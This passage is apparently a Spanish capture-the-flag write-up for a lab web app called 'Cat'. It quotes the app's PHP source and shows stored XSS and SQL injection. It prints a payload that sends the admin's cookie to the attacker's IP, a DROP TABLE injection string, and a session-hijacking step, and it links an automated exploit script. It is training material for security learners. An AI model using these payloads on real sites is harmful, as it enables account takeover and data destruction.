            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginPassword<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginPassword<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginPassword<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loginForm<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toggle-link<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>toggleForm<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Already have an account?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> toggleLink <span class="token operator">=</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">"toggleForm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> registerForm <span class="token operator">=</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">querySelector</span><span class="token punctuation">(</span><span class="token string">".register"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> loginForm <span class="token operator">=</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">querySelector</span><span class="token punctuation">(</span><span class="token string">".login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    toggleLink<span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        event<span class="token punctuation">.</span><span class="token method function property-access">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span>registerForm<span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span> <span class="token operator">===</span> <span class="token string">"block"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            registerForm<span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span> <span class="token operator">=</span> <span class="token string">"none"</span><span class="token punctuation">;</span>
            loginForm<span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span> <span class="token operator">=</span> <span class="token string">"block"</span><span class="token punctuation">;</span>
            toggleLink<span class="token punctuation">.</span><span class="token property-access">textContent</span> <span class="token operator">=</span> <span class="token string">"Register"</span><span class="token punctuation">;</span> <span class="token comment">// Changed text</span>
        <span class="token punctuation">}</span> <span class="token keyword control-flow">else</span> <span class="token punctuation">{</span>
            registerForm<span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span> <span class="token operator">=</span> <span class="token string">"block"</span><span class="token punctuation">;</span>
            loginForm<span class="token punctuation">.</span><span class="token property-access">style</span><span class="token punctuation">.</span><span class="token property-access">display</span> <span class="token operator">=</span> <span class="token string">"none"</span><span class="token punctuation">;</span>
            toggleLink<span class="token punctuation">.</span><span class="token property-access">textContent</span> <span class="token operator">=</span> <span class="token string">"Already have an account?"</span><span class="token punctuation">;</span> <span class="token comment">// Changed text</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-h3 heading-wrapper"><h3 data-heading="**1. Vulnerabilidad a XSS" dir="auto" class="heading" id="**1._Vulnerabilidad_a_XSS"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>**1. Vulnerabilidad a XSS</h3><div class="heading-children"><div class="el-p"><p dir="auto">En las siguientes líneas:</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token comment">// Registration process</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"GET"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'registerForm'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$stmt_check</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username = :username OR email = :email"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$stmt_check</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">':username'</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':email'</span> <span class="token operator">=&gt;</span> <span class="token variable">$email</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token string backtick-quoted-string">``</span><span class="token string backtick-quoted-string">`


Tamto el campo $username como $email no estan siendo sanitizados antes de registrarlos en la base de datos; por lo tanto . Si como atacantes nos registramos de forma que:
`</span><span class="token string backtick-quoted-string">``</span>java
<span class="token string backtick-quoted-string">`Username: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
 Email: cher0@mail.com`</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Si en algun punto logramos que nuestro nombre de cuenta se muestre es probable que podamos robar cookies de usuario. De momento lo dejamos registrado;</p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Script automatizado" dir="auto" class="heading" id="Script_automatizado"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Script automatizado</h3><div class="heading-children"><div class="el-p"><p dir="auto">Para agilizar el proceso de Injeccion del XSS hice un script de python que podeis encontrar en mi perfil de Github ; El script se compone de 4 fases, </p></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">1-Registra el usuario con el payload XSS con las etiquetas necesarias para pillar la cookie del admin</li>
<li data-line="1" dir="auto">2-Se Logea el usuario en la pagina con las peticiones necesarias al servidor</li>
<li data-line="2" dir="auto">3- Sube una imagen indicada en el primer argumento del escript en contest.php</li>
<li data-line="3" dir="auto">4-Se abre un servidor http que captura la Cookie de sesión del administrador de la pagina </li>
</ul></div><div class="el-p"><p dir="auto">Podeis descargarla en el siguiente <a data-tooltip-position="top" aria-label="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" rel="noopener nofollow" class="external-link" href="https://github.com/cher0qui/HTB-Cat-Automated-XSS/tree/main" target="_blank">enlace</a> </p></div></div></div></div></div><div class="el-h1 heading-wrapper"><h1 data-heading="Sqli en accept_cat.php" dir="auto" class="heading" id="Sqli_en_accept_cat.php">Sqli en accept_cat.php</h1><div class="heading-children"><div class="el-p"><p dir="auto">Vamos a observar el codigo:</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'axel'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$cat_name</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$catId</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catId'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$sql_insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO accepted_cats (name) VALUES ('<span class="token interpolation"><span class="token variable">$cat_name</span></span>')"</span><span class="token punctuation">;</span>
            <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql_insert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$stmt_delete</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DELETE FROM cats WHERE cat_id = :cat_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$stmt_delete</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':cat_id'</span><span class="token punctuation">,</span> <span class="token variable">$catId</span><span class="token punctuation">,</span> <span class="token scope">PDO<span class="token punctuation">::</span></span><span class="token constant">PARAM_INT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$stmt_delete</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The cat has been accepted and added successfully."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: Cat ID or Cat Name not provided."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Access denied."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Bueno aqui ya observamos mas info sobre la base de datos; vemos que hay una tabla accepted_cats y otra cats;</p></div><div class="el-p"><p dir="auto">El código incluye una verificación para asegurarse de que solo el usuario <strong><code>axel</code></strong> pueda realizar la inserción o eliminación</p></div><div class="el-p"><p dir="auto">Observamos el campo vulnerable<br>
SQLI:</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token variable">$sql_insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO accepted_cats (name) VALUES ('<span class="token interpolation"><span class="token variable">$cat_name</span></span>')"</span><span class="token punctuation">;</span>
<span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql_insert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">Aquí, el valor de <code>$cat_name</code> proviene directamente de <code>$_POST['catName']</code> sin ser validado ni escapado.</li>
<li data-line="1" dir="auto">Aunque está usando PDO para ejecutar consultas, no está utilizando consultas preparadas con marcadores de posición (<code>:parametro</code>) para esta inserción. En su lugar, está concatenando el valor directamente en la consulta SQL.</li>
<li data-line="2" dir="auto">Esto  nos permite inyectar código SQL  a través del campo <code>catName</code>.</li>
</ul></div><div class="el-p"><p dir="auto">Por ejemplo si mandamos:</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">'<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> accepted_cats<span class="token punctuation">;</span> <span class="token comment">--</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">la consulta que procesa el servidor pasa a ser:</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> accepted_cats <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> accepted_cats<span class="token punctuation">;</span> <span class="token comment">--');</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Pero para ello necesitamos primero ser axel asi que vamos a intentar robar su cookie phpssid con el xss anterior.</p></div><div class="el-h2 heading-wrapper"><h2 data-heading="contest.php" dir="auto" class="heading" id="contest.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>contest.php</h2><div class="heading-children"><div class="el-p"><p dir="auto">Encuentro la linea de codigo donde podemos ver como se guardan nuestros gatos subidos</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded">        <span class="token comment">// Generate unique identifier for the image</span>
        <span class="token variable">$imageIdentifier</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"_"</span><span class="token punctuation">;</span>

        <span class="token comment">// Upload cat photo</span>
        <span class="token variable">$target_dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span>
        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token variable">$target_dir</span> <span class="token operator">.</span> <span class="token variable">$imageIdentifier</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token global">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cat_photo"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$imageFileType</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$target_file</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Check if the file is an actual image or a fake file</span>
        <span class="token variable">$check</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token global">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cat_photo"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$check</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: The file is not an image."</span><span class="token punctuation">;</span>
            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check if the file already exists</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: The file already exists."</span><span class="token punctuation">;</span>
            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Check file size</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cat_photo"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">500000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: The file is too large."</span><span class="token punctuation">;</span>
            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// Allow only certain file formats</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"png"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$imageFileType</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$error_message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Error: Only JPG, JPEG, and PNG files are allowed."</span><span class="token punctuation">;</span>
            <span class="token variable">$uploadOk</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">No podiamos encontrar nuestra imagen en uploads/ ya que se genera un uniqid() seguido de " _ "  </p></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Exploit" dir="auto" class="heading" id="Exploit"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Exploit</h2><div class="heading-children"><div class="el-p"><p dir="auto">Primero nos registramos con un XSS que mande la cookie de axel a nuestro servidor </p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>document.location<span class="token operator">=</span><span class="token string">'http://10.10.14.232:2323/?c='</span>+document.cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250207131614.png" src="Pasted image 20250207131614.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207131614.png" src="machines/cat/imgs/pasted-image-20250207131614.png"></span></p></div><div class="el-p"><p dir="auto">Acto seguido abrimos un servidor http por el puerto indicado en XSS y subimos un gato, cuando el admin lo revise y muestre nuestro "username" se triggerea el XSS mandandonos su cookie;<br>
<span alt="Pasted image 20250207131820.png" src="Pasted image 20250207131820.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207131820.png" src="machines/cat/imgs/pasted-image-20250207131820.png"></span></p></div><div class="el-p"><p dir="auto">Ahora que tenemos el phpssid de axel probamos a hacer un session Hijacking modificando nuestra cookie</p></div><div class="el-p"><p dir="auto">Admin Panel:<br>
<span alt="Pasted image 20250207132842.png" src="Pasted image 20250207132842.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207132842.png" src="machines/cat/imgs/pasted-image-20250207132842.png"></span></p></div><div class="el-p"><p dir="auto">Ahora vamos a explotar la injeccion sql en accept_cat.php</p></div><div class="el-p"><p dir="auto">Recordemos el codigo</p></div><div class="el-pre"><pre class="language-php" tabindex="0"><code data-line="0" class="language-php is-loaded"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token global">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'axel'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
